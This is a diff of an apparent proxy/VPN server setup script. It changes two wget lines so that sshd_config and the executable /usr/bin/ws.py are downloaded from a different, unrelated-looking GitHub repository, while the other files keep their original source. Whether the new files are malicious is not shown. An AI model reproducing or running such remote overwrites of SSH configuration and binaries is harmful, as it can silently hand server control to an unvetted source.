@@ -126,7 +126,7 @@ res3() {
 wget -O /etc/haproxy/haproxy.cfg "https://github.com/jaka1m/project/raw/main/up/haproxy.cfg"
 }
 res4() {
-wget -q -O /etc/ssh/sshd_config "https://github.com/jaka1m/project/raw/main/up/sshd"
+wget -q -O /etc/ssh/sshd_config "https://github.com/nilacanti/pap/raw/main/xlrd/sshd"
 }
 res5() {
 wget -O /etc/nginx/conf.d/xray.conf "https://github.com/jaka1m/project/raw/main/up/xray"
@@ -135,7 +135,7 @@ res6() {
 wget -O /etc/nginx/nginx.conf "https://github.com/jaka1m/project/raw/main/up/nginx.conf"
 }
 res7() {
-wget -O /usr/bin/ws.py "https://github.com/jaka1m/project/raw/main/up/ws.py"
+wget -O /usr/bin/ws.py "https://github.com/nilacanti/pap/raw/main/xlrd/ws.py"
 }
 res8() {
 wget -O /etc/systemd/system/ws.service "https://github.com/jaka1m/project/raw/main/up/ws.service"
